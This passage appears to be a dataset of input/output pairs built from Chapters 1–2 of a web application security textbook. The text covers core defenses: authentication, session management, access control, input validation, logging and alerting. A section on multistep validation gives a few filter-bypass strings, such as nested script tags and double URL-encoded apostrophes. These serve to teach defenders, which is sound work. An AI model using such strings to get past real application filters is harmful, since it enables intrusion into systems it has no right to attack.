SQL injection continue\nto appear, their prevalence is gradually diminishing. Further, the instances\nthat remain are becoming more difficult to find and exploit. Much current\nresearch is focused on developing advanced techniques for attacking more\nsubtle manifestations of vulnerabilities which a few years ago could be easily\ndetected and exploited using only a browser.\nA second prominent trend is a gradual shift in attention from traditional\nattacks against the server side of the application to those that target other\nusers. The latter kind of attack still leverages defects within the application\nitself, but it generally involves some kind of interaction with another user, to\ncompromise that user’s dealings with the vulnerable application. This is a\ntrend that has been replicated in other areas of software security. As awareness\nof security threats matures, flaws in the server side are the first to be well\nunderstood and addressed, leaving the client side as a key battleground as the\nlearning process continues. Of all the attacks described in this book, those\nagainst other users are evolving the most quickly, and are the focus of most\ncurrent research."
  },
  {
    "input": "Chapter Summary",
    "output": "70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 13\nChapter 1 ■ Web Application (In)security 13\nChapter Summary\nIn a few short years, the World Wide Web has evolved from purely static infor-\nmation repositories into highly functional applications that process sensitive\ndata and perform powerful actions with real-world consequences. During this\ndevelopment, several factors have combined to bring about the weak security\nposture demonstrated by the majority of today’s web applications.\nMost applications face the core security problem that users can submit arbi-\ntrary input. Every aspect of the user’s interaction with the application may be\nmalicious and should be regarded as such unless proven otherwise. Failure to\nproperly address this problem can leave applications vulnerable to attack in\nnumerous ways.\nAll of the evidence about the current state of web application security indi-\ncates that this problem has not been resolved on any significant scale, and that\nattacks against web applications present a serious threat both to the organiza-\ntions that deploy them and to the users who access them.\n70779c01.qxd:WileyRed 9/14/07 3:12 PM Page 14"
  },
  {
    "input": "Chapter 2: Core Defense Mechanisms",
    "output": "70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 15\nCHAPTER\n2\nCore Defense Mechanisms\nThe fundamental security problem with web applications—that all user\ninput is untrusted—gives rise to a number of security mechanisms that appli-\ncations use to defend themselves against attack. Virtually all applications\nemploy mechanisms that are conceptually similar, although the details of the\ndesign and the effectiveness of the implementation differ very widely indeed.\nThe defense mechanisms employed by web applications comprise the fol-\nlowing core elements:\n■■ Handling user access to the application’s data and functionality, to pre-\nvent users from gaining unauthorized access.\n■■ Handling user input to the application’s functions, to prevent mal-\nformed input from causing undesirable behavior.\n■■ Handling attackers, to ensure that the application behaves appropri-\nately when being directly targeted, taking suitable defensive and offen-\nsive measures to frustrate the attacker.\n■■ Managing the application itself, by enabling administrators to monitor\nits activities and configure its functionality.\nBecause of their central role in addressing the core security problem, these\nmechanisms also make up the vast majority of a typical application’s attack\nsurface. If knowing your enemy is the first rule of warfare, then understanding\nthese mechanisms thoroughly is the main prerequisite to being able to attack\n15"
  },
  {
    "input": "Handling User Access",
    "output": "70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 16\n16 Chapter 2 ■ Core Defense Mechanisms\napplications effectively. If you are new to hacking web applications, and even\nif you are not, you should be sure to take time to understand how these core\nmechanisms work in each of the applications you encounter, and identify the\nweak points that leave them vulnerable to attack.\nHandling User Access\nA central security requirement that virtually any application needs to meet is\nto control users’ access to its data and functionality. In a typical situation, there\nare several different categories of user; for example, anonymous users, ordi-\nnary authenticated users, and administrative users. Further, in many situa-\ntions different users are permitted to access a different set of data; for example,\nusers of a web mail application should be able to read their own email but not\nother people’s.\nMost web applications handle access using a trio of interrelated security\nmechanisms:\n■■ Authentication\n■■ Session management\n■■ Access control\nEach of these mechanisms represents a significant area of an application’s\nattack surface, and each is absolutely fundamental to an application’s overall\nsecurity posture. Because of their interdependencies, the overall security pro-\nvided by the mechanisms is only as strong as the weakest link in the chain. A\ndefect in any single component may enable an attacker to gain unrestricted\naccess to the application’s functionality and data.\nAuthentication\nThe authentication mechanism is logically the most basic dependency in an\napplication’s handling of user access. Authenticating a user involves estab-\nlishing that the user is in fact who he claims to be. Without this facility, the\napplication would need to treat all users as anonymous—the lowest possible\nlevel of trust.\nThe majority of today’s web applications employ the conventional authenti-\ncation model in which the user submits a username and password, which the\napplication checks for validity. Figure2-1 shows a typical login function. In secu-\nrity-critical applications such as those used by online banks, this basic model is\nusually supplemented by additional credentials and a multistage login process.\nWhen security requirements are higher still, other authentication models may be\nused, based on client certificates, smartcards, or challenge-response tokens. In\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 17\nChapter 2 ■ Core Defense Mechanisms 17\naddition to the core login process, authentication mechanisms often employ a\nrange of other supporting functionality, such as self-registration, account recov-\nery, and a password change facility.\nFigure 2-1: A typical login function\nDespite their superficial simplicity, authentication mechanisms suffer from\na wide range of defects, in both design and implementation. Common prob-\nlems may enable an attacker to identify other users’ usernames, guess their\npasswords, or bypass the login function altogether by exploiting defects in its\nlogic. When you are attacking a web application, you should invest a signifi-\ncant amount of attention in the various authentication-related functions that it\ncontains. Surprisingly frequently, defects in this functionality will enable you\nto gain unauthorized access to sensitive data and functionality.\nSession Management\nThe next logical task in the process of handling user access is to manage the\nauthenticated user’s session. After successfully logging in to the application,\nthe user will access various pages and functions, making a series of HTTP\nrequests from their browser. At the same time, the application will be receiving\ncountless other requests from different users, some of whom are authenticated\nand some of whom are anonymous. In order to enforce effective access control,\nthe application needs a way of identifying and processing the series of requests\nthat originate from each unique user.\nVirtually all web applications meet this requirement by creating a session\nfor each user and issuing the user a token that identifies the session. The ses-\nsion itself is a set of data structures held on the server, which are used to track\nthe state of the user’s interaction with the application. The token is a unique\nstring that the application maps to the session. When a user has received a\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 18\n18 Chapter 2 ■ Core Defense Mechanisms\ntoken, the browser automatically submits this back to the server in each sub-\nsequent HTTP request, enabling the application to associate the request with\nthat user. HTTP cookies are the standard method for transmitting session\ntokens, although many applications use hidden form fields or the URL query\nstring for this purpose. If a user does not make a request for a given period,\nthen the session is ideally expired, as in Figure2-2.\nIn terms of attack surface, the session management mechanism is highly\ndependent on the security of its tokens, and the majority of attacks against it\nseek to compromise the tokens issued to other users. If this is possible, an\nattacker can masquerade as the victim user and use the application just as if\nthey had actually authenticated as that user. The principal areas of vulnerabil-\nity arise from defects in the way tokens are generated, enabling an attacker to\nguess the tokens issued to other users, and defects in the way tokens are sub-\nsequently handled, enabling an attacker to capture other users’ tokens.\nFigure 2-2: An application enforcing session timeout\nA small number of applications dispense with the need for session tokens by\nusing other means of re-identifying users across multiple requests. If HTTP’s\nbuilt-in authentication mechanism is used, then the browser automatically\nresubmits the user’s credentials with each request, enabling the application to\nidentify the user directly from these. In other cases, the application stores the\nstate information on the client side rather than the server, usually in encrypted\nform to prevent tampering.\nAccess Control\nThe final logical step in the process of handling user access is to make and\nenforce correct decisions regarding whether each individual request should be\npermitted or denied. If the preceding mechanisms are functioning correctly,\nthe application knows the identity of the user from whom each request is\nreceived. On this basis, it needs to decide whether that user is authorized to\nperform the action, or access the data, that he is requesting (see Figure2-3).\nThe access control mechanism usually needs to implement some fine-\ngrained logic, with different considerations being relevant to different areas of"
  },
  {
    "input": "Handling User Input",
    "output": "70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 19\nChapter 2 ■ Core Defense Mechanisms 19\nthe application and different types of functionality. An application might sup-\nport numerous different user roles, each involving different combinations of\nspecific privileges. Individual users may be permitted to access a subset of the\ntotal data held within the application. Specific functions may implement trans-\naction limits and other checks, all of which need to be properly enforced based\non the user’s identity.\nFigure 2-3: An application enforcing access control\nBecause of the complex nature of typical access control requirements, this\nmechanism is a frequent source of security vulnerabilities that enable an\nattacker to gain unauthorized access to data and functionality. Developers\nvery often make flawed assumptions about how users will interact with the\napplication, and frequently make oversights by omitting access control checks\nfrom some application functions. Probing for these vulnerabilities is often\nlaborious because essentially the same checks need to be repeated for each\nitem of functionality. Because of the prevalence of access control flaws, how-\never, this effort is always a worthwhile investment when you are attacking a\nweb application.\nHandling User Input\nRecall the fundamental security problem described in Chapter 1: all user input\nis untrusted. A huge variety of different attacks against web applications\ninvolve submitting unexpected input, crafted to cause behavior that was not\nintended by the application’s designers. Correspondingly, a key requirement\nfor an application’s security defenses is that it must handle user input in a safe\nmanner.\nInput-based vulnerabilities can arise anywhere within an application’s func-\ntionality, and in relation to practically every type of technology in common use.\n“Input validation” is often cited as the necessary defense against these attacks.\nHowever, there is no single protective mechanism that can be employed every-\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 20\n20 Chapter 2 ■ Core Defense Mechanisms\nwhere, and defending against malicious input is often not as straightforward as\nit sounds.\nVarieties of Input\nA typical web application processes user-supplied data in a range of different\nforms. Some kinds of input validation may not be feasible or desirable for all\nof these forms of input. Figure 2-4 shows the kind of input validation often\nperformed by a user registration function.\nIn many cases, an application may be able to impose very stringent valida-\ntion checks on a specific item of input. For example, a username submitted to\na login function may be required to have a maximum length of eight charac-\nters and contain only alphabetical letters.\nIn other cases, the application must tolerate a wider range of possible input.\nFor example, an address field submitted to a personal details page might legit-\nimately contain letters, numbers, spaces, hyphens, apostrophes, and other char-\nacters. For this item, there are still restrictions that can feasibly be imposed,\nhowever. The data should not exceed a reasonable length limit (such as 50 char-\nacters), and should not contain any HTML mark-up.\nIn some situations, an application may need to accept completely arbitrary\ninput from users. For example, a user of a blogging application may create a\nblog whose subject is web application hacking. Posts and comments made to\nthe blog may quite legitimately contain explicit attack strings that are being\ndiscussed. The application may need to store this input within a database,\nwrite it to disk, and display it back to users in a safe way. It cannot simply\nreject the input because it looks potentially malicious without substantially\ndiminishing the value of the application to some of its user base.\nFigure 2-4: An application performing input validation\nIn addition to the various kinds of input that is entered by users via the\nbrowser interface, a typical application also receives numerous items of data\nthat began their life on the server and that are sent to the client so that the client\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 21\nChapter 2 ■ Core Defense Mechanisms 21\ncan transmit them back to the server on subsequent requests. This includes\nitems such as cookies and hidden form fields, which are not seen by ordinary\nusers of the application but which an attacker can of course view and modify.\nIn these cases, applications can often perform very specific validation of the\ndata received. For example, a parameter might be required to have one of a\nspecific set of known values, such as a cookie indicating the user’s preferred\nlanguage, or to be in a specific format, such as a customer ID number. Further,\nwhen an application detects that server-generated data has been modified in a\nway that is not possible for an ordinary user with a standard browser, this is\noften an indication that the user is attempting to probe the application for vul-\nnerabilities. In these cases, the application should reject the request and log the\nincident for potential investigation (see the “Handling Attackers” sectionlater\nin this chapter).\nApproaches to Input Handling\nThere are various broad approaches that are commonly taken to the problem\nof handling user input. Different approaches are often preferable for different\nsituations and different types of input, and a combination of approaches may\nsometimes be desirable.\n“Reject Known Bad”\nThis approach typically employs a blacklist containing a set of literal strings or\npatterns that are known to be used in attacks. The validation mechanism\nblocks any data that matches the blacklist and allows everything else.\nIn general, this is regarded as the least effective approach to validating user\ninput, for two main reasons. First, a typical vulnerability in a web application\ncan be exploited using a wide variety of different input, which may be\nencoded or represented in various different ways. Except in the simplest of\ncases, it is likely that a blacklist will omit some patterns of input that can be\nused to attack the application. Second, techniques for exploitation are con-\nstantly evolving. Novel methods for exploiting existing categories of vulnera-\nbility are unlikely to be blocked by current blacklists.\n“Accept Known Good”\nThis approach employs a white list containing a set of literal strings or pat-\nterns, or a set of criteria, that is known to match only benign input. The vali-\ndation mechanism allows data that matches the white list, and blocks\neverything else. For example, before looking up a requested product code in\nthe database, an application might validate that it contains only alphanumeric\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 22\n22 Chapter 2 ■ Core Defense Mechanisms\ncharacters and is exactly six characters long. Given the subsequent processing\nthat will be done on the product code, the developers know that input passing\nthis test cannot possibly cause any problems.\nIn cases where this approach is feasible, it is regarded as the most effective\nway of handling potentially malicious input. Provided that due care is taken in\nconstructing the white list, an attacker will not be able to use crafted input to\ninterfere with the application’s behavior. However, there are numerous situa-\ntions in which an application must accept data for processing that does not\nmeet any reasonable criteria for what is known to be “good.” For example,\nsome people’s names contain the apostrophe and hyphen characters. These\ncan be used in attacks against databases, but it may be a requirement that the\napplication should permit anyone to register under their real name. Hence,\nwhile it is often extremely effective, the white-list-based approach does not\nrepresent an all-purpose solution to the problem of handling user input.\nSanitization\nThis approach recognizes the need to sometimes accept data that cannot be\nguaranteed as safe. Instead of rejecting this input, the application sanitizes it in\nvarious ways to prevent it from having any adverse effects. Potentially mali-\ncious characters may be removed from the data altogether, leaving only what\nis known to be safe, or they may be suitably encoded or “escaped” before fur-\nther processing is performed.\nApproaches based on data sanitization are often highly effective, and in\nmany situations they can be relied upon as a general solution to the problem of\nmalicious input. For example, the usual defense against cross-site scripting\nattacks is to HTML-encode dangerous characters before these are embedded\ninto pages of the application (see Chapter 12). However, effective sanitization\nmay be difficult to achieve if several kinds of potentially malicious data need\nto be accommodated within one item of input. In this situation, a boundary\nvalidation approach is desirable, as described later.\nSafe Data Handling\nVery many web application vulnerabilities arise because user-supplied data is\nprocessed in unsafe ways. It is often the case that vulnerabilities can be\navoided, not by validating the input itself but by ensuring that the processing\nthat is performed on it is inherently safe. In some situations, there are safe pro-\ngramming methods available that avoid common problems. For example, SQL\ninjection attacks can be prevented through the correct use of parameterized\nqueries for database access (see Chapter 9). In other situations, application\nfunctionality can be designed in such a way that inherently unsafe practices,\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 23\nChapter 2 ■ Core Defense Mechanisms 23\nsuch as passing user input to an operating system command interpreter, are\navoided altogether.\nThis approach cannot be applied to every kind of task that web applications\nneed to perform, but where it is available it is an effective general approach to\nhandling potentially malicious input.\nSemantic Checks\nThe defenses described so far all address the need to defend the application\nagainst various kinds of malformed data whose content has been crafted to\ninterfere with the application’s processing. However, with some vulnerabili-\nties the input supplied by the attacker is identical to the input that an ordinary,\nnon-malicious user may submit. What makes it malicious is the different cir-\ncumstances in which it is submitted. For example, an attacker might seek to\ngain access to another user’s bank account by changing an account number\ntransmitted in a hidden form field. No amount of syntactic validation will dis-\ntinguish between the user’s data and the attacker’s. To prevent unauthorized\naccess, the application needs to validate that the account number submitted\nbelongs to the user who has submitted it.\nBoundary Validation\nThe idea of validating data across trust boundaries is a familiar one. The core\nsecurity problem with web applications arises because data received from\nusers is untrusted. While input validation checks implemented on the client\nside may improve performance and the user’s experience, they do not provide\nany assurance over the data that actually reaches the server. The point at\nwhich user data is first received by the server-side application represents a\nhuge trust boundary, at which the application needs to take measures to\ndefend itself against malicious input.\nGiven the nature of the core problem, it is tempting to think of the input val-\nidation problem in terms of a frontier between the Internet, which is “bad” and\nuntrusted, and the server-side application, which is “good” and trusted. In\nthis picture, the role of input validation is to clean potentially malicious data\non arrival and then pass the clean data to the trusted application. From this\npoint onwards, the data may be trusted and processed without any further\nchecks or concern about possible attacks.\nAs will become evident when we begin to examine some actual vulnerabil-\nities, this simple picture of input validation is inadequate, for several reasons:\n■■ Given the wide range of functionality that applications implement, and\nthe different technologies in use, a typical application needs to defend\nitself against a huge variety of input-based attacks, each of which may\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 24\n24 Chapter 2 ■ Core Defense Mechanisms\nemploy a diverse set of crafted data. It would be very difficult to devise\na single mechanism at the external boundary to defend against all of\nthese attacks.\n■■ Many application functions involve chaining together a series of\ndifferent types of processing. A single piece of user-supplied input\nmight result in a number of operations in different components, with\nthe output of each being used as the input for the next. As the data is\ntransformed, it might come to bear no resemblance to the original\ninput, and a skilled attacker may be able to manipulate the application\nto cause malicious input to be generated at a key stage of the process-\ning, attacking the component which receives this data. It would be\nextremely difficult to implement a validation mechanism at the external\nboundary to foresee all of the possible results of processing each piece\nof user input.\n■■ Defending against different categories of input-based attack may entail\nperforming different validation checks on user input that are incompat-\nible with one another. For example, preventing cross-site scripting\nattacks may require HTML-encoding the >character as &gt;while pre-\nventing command injection attacks may require blocking input contain-\ning the &and ;characters. Attempting to prevent all categories of attack\nsimultaneously at the application’s external boundary may sometimes\nbe impossible.\nA more effective model uses the concept of boundary validation. Here, each\nindividual component or functional unit of the server-side application treats\nits inputs as coming from a potentially malicious source. Data validation is\nperformed at each of these trust boundaries, in addition to the external frontier\nbetween the client and server. This model provides a solution to the problems\ndescribed in the previous list. Each component can defend itself against the\nspecific types of crafted input to which it may be vulnerable. As data passes\nthrough different components, validation checks can be performed against\nwhatever value the data has as a result of previous transformations. And\nbecause the various validation checks are implemented at different stages of\nprocessing, they are unlikely to come into conflict with one another.\nFigure 2-5 illustrates a typical situation where boundary validation is the\nmost effective approach to defending against malicious input. The user login\nresults in several steps of processing being performed on user-supplied input,\nand suitable validation is performed at each step:\n1. The application receives the user’s login details. The form handler vali-\ndates that each item of input contains only permitted characters, is\nwithin a specific length limit, and does not contain any known attack\nsignatures.\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 25\nChapter 2 ■ Core Defense Mechanisms 25\n2. The application performs an SQL query to verify the user’s credentials.\nTo prevent SQL injection attacks, any characters within the user input\nthat may be used to attack the database are escaped before the query is\nconstructed.\n3. If the login succeeds, the application passes certain data from the user’s\nprofile to a SOAP service to retrieve further information about her\naccount. To prevent SOAP injection attacks, any XML metacharacters\nwithin the user’s profile data are suitably encoded.\n4. The application displays the user’s account information back to the\nuser’s browser. To prevent cross-site scripting attacks, the application\nHTML-encodes any user-supplied data that is embedded into the\nreturned page.\n2. Clean SQL\n1. General checks\nSQL query\nLogin submission\nDatabase\nDisplay account\nUser\ndetails\nApplication\nserver 3. Encode XML\n4. Sanitize output metacharacters\nSOAP\nmessage\nSOAP service\nFigure 2-5: An application function using boundary validation at multiple stages of\nprocessing\nThe specific vulnerabilities and defenses involved in the described scenario\nwill be examined in detail in later chapters. If variations on this functionality\ninvolved passing data to further application components, then similar\ndefenses would need to be implemented at the relevant trust boundaries. For\nexample, if a failed login caused the application to send a warning email to the\nuser, then any user data incorporated into the email may need to be checked\nfor SMTP injection attacks.\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 26\n26 Chapter 2 ■ Core Defense Mechanisms\nMultistep Validation and Canonicalization\nA common problem encountered by input-handling mechanisms arises when\nuser-supplied input is manipulated across several steps as part of the valida-\ntion logic. If this process is not handled carefully, then an attacker may be able\nto construct crafted input that succeeds in smuggling malicious data through\nthe validation mechanism. One version of this problem occurs when an appli-\ncation attempts to sanitize user input by removing or encoding certain charac-\nters or expressions. For example, an application may attempt to defend against\nsome cross-site scripting attacks by stripping the expression\n<script>\nfrom any user-supplied data. However, an attacker may be able to bypass the\nfilter by supplying the following input:\n<scr<script>ipt>\nWhen the blocked expression is removed, the surrounding data contracts to\nrestore the malicious payload, because the filter is not being applied recursively.\nSimilarly, if more than one validation step is performed on user input, an\nattacker may be able to exploit the ordering of these steps to bypass the filter.\nFor example, if the application first removes script tags recursively and then\nstrips any quotation marks, the following input can be used to defeat the vali-\ndation:\n<scr”ipt>\nA different problem arises in relation to data canonicalization. When input\nis sent from the user’s browser, it may be encoded in various ways. These\nencoding schemes exist in order that unusual characters and binary data may\nbe transmitted safely over HTTP (see Chapter 3 for more details). Canonical-\nization is the process of converting or decoding data into a common character\nset. If any canonicalization is carried out after input filters have been applied,\nthen an attacker may be able to use encoding to bypass the validation mecha-\nnism. For example, an application may attempt to defend against some SQL\ninjection attacks by removing the apostrophe character from user input. How-\never, if the sanitized data is subsequently canonicalized, then an attacker may\nbe able to use the URL-encoded form\n%27\nto defeat the validation. If the application strips this URL-encoded form, but also\nperforms further canonicalization, then the following bypass may be effective:\n%%2727"
  },
  {
    "input": "Handling Attackers",
    "output": "70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 27\nChapter 2 ■ Core Defense Mechanisms 27\nThroughout this book, we will describe numerous attacks of this kind which\nare effective in defeating many applications’ defenses against common input-\nbased vulnerabilities.\nAvoiding problems with multistep validation and canonicalization can\nsometimes be difficult, and there is no single solution to the problem. One\napproach is to perform sanitization steps recursively, continuing until no fur-\nther modifications have been made on an item of input. However, where the\ndesired sanitization involves escaping a problematic character, this may result\nin an infinite loop. Often, the problem can only be addressed on a case-by-case\nbasis, based upon the types of validation being performed. Where feasible, it\nmay be preferable to avoid attempting to clean some kinds of bad input, and\nsimply reject it altogether.\nHandling Attackers\nAnyone designing an application for which security is remotely important\nmust work on the assumption that it will be directly targeted by dedicated and\nskilled attackers. A key function of the application’s security mechanisms is to\nbe able to handle and react to these attacks in a controlled way. These mecha-\nnisms often incorporate a mix of defensive and offensive measures designed to\nfrustrate an attacker as much as possible, and provide appropriate notification\nand evidence to the application’s owners of what has taken place. Measures\nimplemented to handle attackers typically include the following tasks:\n■■ Handling errors\n■■ Maintaining audit logs\n■■ Alerting administrators\n■■ Reacting to attacks\nHandling Errors\nHowever careful an application’s developers are in validating user input, it is\nvirtually inevitable that some unanticipated errors will occur. Errors resulting\nfrom the actions of ordinary users are likely to be identified during functional-\nity and user acceptance testing, and so will be taken account of before the\napplication is deployed in a production context. However, it is very difficult to\nanticipate every possible way in which a malicious user may interact with the\napplication, and so further errors should be expected when the application\ncomes under attack.\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 28\n28 Chapter 2 ■ Core Defense Mechanisms\nA key defense mechanism is for the application to handle unexpected\nerrors in a graceful manner, and either recover from them or present a suit-\nable error message to the user. In a production context, the application\nshould never return any system-generated messages or other debug infor-\nmation in its responses. As you will see throughout this book, overly verbose\nerror messages can greatly assist malicious users in furthering their attacks\nagainst the application. In some situations, an attacker can leverage defective\nerror handling to retrieve sensitive information within the error messages\nthemselves, providing a valuable channel for stealing data from the applica-\ntion. Figure 2-6 shows an example of an unhandled error resulting in a ver-\nbose error message.\nFigure 2-6: An unhandled error\nMost web development languages provide good error-handling support\nthrough try-catch blocks and checked exceptions. Application code should\nmake extensive use of these constructs to catch specific and general errors and\nhandle them appropriately. Further, most application servers can be configured\nto deal with unhandled application errors in customized ways, for example by\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 29\nChapter 2 ■ Core Defense Mechanisms 29\npresenting an uninformative error message. See Chapter 14 for more details of\nthese measures.\nEffective error handling is often integrated with the application’s logging\nmechanisms, which record as much debug information as possible about\nunanticipated errors. Very often, unexpected errors point to defects within the\napplication’s defenses that can be addressed at the source if the application’s\nowner has the required information.\nMaintaining Audit Logs\nAudit logs are primarily of value when investigating intrusion attempts against\nan application. Following such an incident, effective audit logs should enable\nthe application’s owners to understand exactly what has taken place, which\nvulnerabilities (if any) were exploited, whether the attacker gained unautho-\nrized access to data or performed any unauthorized actions, and as far as pos-\nsible, provide evidence as to the intruder’s identity.\nIn any application for which security is important, key events should be\nlogged as a matter of course. At a minimum, these typically include:\n■■ All events relating to the authentication functionality, such as successful\nand failed login, and change of password.\n■■ Key transactions, such as credit card payments and funds transfers.\n■■ Access attempts that are blocked by the access control mechanisms.\n■■ Any requests containing known attack strings that indicate overtly\nmalicious intentions.\nIn many security-critical applications, such as those used by online banks,\nevery single client request is logged in full, providing a complete forensic\nrecord that can be used to investigate any incidents.\nEffective audit logs typically record the time of each event, the IP address\nfrom which the request was received, the session token, and the user’s account\n(if authenticated). Such logs need to be strongly protected against unautho-\nrized read or write access. An effective approach is to store audit logs on an\nautonomous system that accepts only update messages from the main appli-\ncation. In some situations, logs may be flushed to write-once media to ensure\ntheir integrity in the event of a successful attack.\nIn terms of attack surface, poorly protected audit logs can provide a gold\nmine of information to an attacker, disclosing a host of sensitive information\nsuch as session tokens and request parameters that may enable them to imme-\ndiately compromise the entire application (see Figure2-7).\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 30\n30 Chapter 2 ■ Core Defense Mechanisms\nFigure 2-7: Poorly protected application logs containing sensitive\ninformation submitted by other users\nAlerting Administrators\nAudit logs enable an application’s owners to retrospectively investigate intru-\nsion attempts, and if possible, take legal action against the perpetrator. How-\never, in many situations it is desirable to take much more immediate action, in\nreal time, in response to attempted attacks. For example, administrators may\nblock the IP address or user account being used by an attacker. In extreme\ncases, they may even take the application offline while the attack is investi-\ngated and remedial action taken. Even if a successful intrusion has already\noccurred, its practical effects may be mitigated if defensive action is taken at an\nearly stage.\nIn most situations, alerting mechanisms must balance the conflicting objec-\ntives of reporting each genuine attack reliably and of not generating so many\nalerts that these come to be ignored. A well-designed alerting mechanism can\nuse a combination of factors to diagnose that a determined attack is underway,\nand can aggregate related events into a single alert where possible. Anomalous\nevents monitored by alerting mechanisms often include:\n■■ Usage anomalies, such as large numbers of requests being received\nfrom a single IP address or user, indicating a scripted attack.\n■■ Business anomalies, such as an unusual number of funds transfers\nbeing made to or from a single bank account.\n■■ Requests containing known attack strings.\n■■ Requests where data that is hidden from ordinary users has been\nmodified.\n70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 31\nChapter 2 ■ Core Defense Mechanisms 31\nSome of these functions can be provided reasonably well by off-the-shelf\napplication firewalls and intrusion detection products. These typically use a\nmixture of signature- and anomaly-based rules to identify malicious use of the\napplication, and may reactively block malicious requests as well as issue alerts\nto administrators. These products can form a valuable layer of defense pro-\ntecting a web application, particularly in the case of existing applications\nknown to contain problems but where resources to fix these are not immedi-\nately available. However, their effectiveness is normally limited by the fact\nthat each web application is different, and so the rules employed are inevitably\ngeneric to some extent. Web application firewalls are normally good at identi-\nfying the most obvious attacks, where an attacker submits standard attack\nstrings in each request parameter. However, many attacks are more subtle than\nthis, for example modifying the account number in a hidden field to access\nanother user’s data, or submitting requests out of sequence to exploit defects\nin the application’s logic. In these cases, a request submitted by an attacker\nmay be identical to that submitted by a benign user—what makes it mali-\ncious are the circumstances in which it is made.\nIn any security-critical application, the most effective way to implement\nreal-time alerting is to integrate this tightly with the application’s input vali-\ndation mechanisms and other controls. For example, if a cookie is expected to\nhave one of a specific set of values, then any violation of this indicates that its\nvalue has been modified in way that is not possible for ordinary users of the\napplication. Similarly, if a user changes an account number in a hidden field to\nidentify a different user’s account, this strongly indicates malicious intent. The\napplication should already be checking for these attacks as part of its primary\ndefenses, and these protective mechanisms can easily hook into the applica-\ntion’s alerting mechanism to provide fully customized indicators of malicious\nactivity. Because these checks have been tailored to the application’s actual\nlogic, with a fine-grained knowledge of how ordinary users should be behav-\ning, they are much less prone to false positives than any off-the-shelf solution,\nhowever configurable or able to learn that solution may be.\nReacting to Attacks\nIn addition to alerting administrators, many security-critical applications con-\ntain built-in mechanisms to react defensively to users who are identified as\npotentially malicious.\nBecause each application is different, most real-world attacks require an\nattacker to probe systematically for vulnerabilities, submitting numerous\nrequests containing crafted input designed to indicate the presence of various\ncommon vulnerabilities. Effective input validation mechanisms will identify\nmany of these requests as potentially malicious, and block the input from"
  },
  {
    "input": "Managing the Application",
    "output": "70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 32\n32 Chapter 2 ■ Core Defense Mechanisms\nhaving any undesirable effect on the application. However, it is sensible to\nassume that some bypasses to these filters exist, and that the application does\ncontain some actual vulnerabilities waiting to be discovered and exploited. At\nsome point, an attacker working systematically is likely to discover these\ndefects.\nFor this reason, some applications take automatic reactive measures to frus-\ntrate the activities of an attacker who is working in this way, for example by\nresponding increasingly slowly to the attacker’s requests or by terminating the\nattacker’s session, requiring him to log in or perform other steps before con-\ntinuing the attack. While these measures will not defeat the most patient and\ndetermined attacker, they will deter many more casual attackers, and will buy\nadditional time for administrators to monitor the situation and take more\ndrastic action if desired.\nReacting to apparent attackers is not, of course, a substitute for fixing any\nvulnerabilities that exist within the application. However, in the real world,\neven the most diligent efforts to purge an application of security flaws may\nleave some exploitable defects remaining. Placing further obstacles in the way\nof an attacker is an effective defense-in-depth measure that reduces the likeli-\nhood that any residual vulnerabilities will be found and exploited.\nManaging the Application\nAny useful application needs to be managed and administered, and this facil-\nity often forms a key part of the application’s security mechanisms, providing\na way for administrators to manage user accounts and roles, access monitoring\nand audit functions, perform diagnostic tasks, and configure aspects of the\napplication’s functionality.\nIn many applications, administrative functions are implemented within the\napplication itself, accessible through the same web interface as its core nonse-\ncurity functionality, as shown in Figure2-8. Where this is the case, the admin-\nistrative mechanism represents a critical part of the application’s attack\nsurface. Its primary attraction for an attacker is as a vehicle for privilege esca-\nlation, for example:\n■■ Weaknesses in the authentication mechanism may enable an attacker\nto gain administrative access, effectively compromising the entire\napplication.\n■■ Many applications do not implement effective access control of some of\ntheir administrative functions. An attacker may find a means of creat-\ning a new user account with powerful privileges."
  },
  {
    "input": "Chapter Summary",
    "output": "70779c02.qxd:WileyRed 9/14/07 3:12 PM Page 33\nChapter 2 ■ Core Defense Mechanisms 33\n■■ Administrative functionality often involves displaying data that origi-\nnated from ordinary users. Any cross-site scripting flaws within the\nadministrative interface can lead to compromise of a user session that is\nguaranteed to have powerful privileges.\n■■ Administrative functionality is often subjected to less rigorous security\ntesting, because its users are deemed to be trusted, or because penetra-\ntion testers are given access to only low-privileged accounts. Further, it\noften has a need to perform inherently dangerous operations, involving\naccess to files on disk or operating system commands. If an attacker can\ncompromise the administrative function, they can often leverage it to\ntake control of the entire server.\nFigure 2-8: An administrative interface within a web application.\nChapter Summary\nDespite their extensive differences, virtually all web applications employ the\nsame core security mechanisms in some shape or form. These mechanisms\nrepresent an application’s primary defenses against malicious users, and\ntherefore also comprise the bulk of the application’s attack surface. The vul-\nnerabilities we shall examine later in this book mainly arise from defects\nwithin these core mechanisms.\nOf these components, the mechanisms for handling user access and user\ninput are the most important and should take up most of your attention when"
  },
  {
    "input": "Questions",
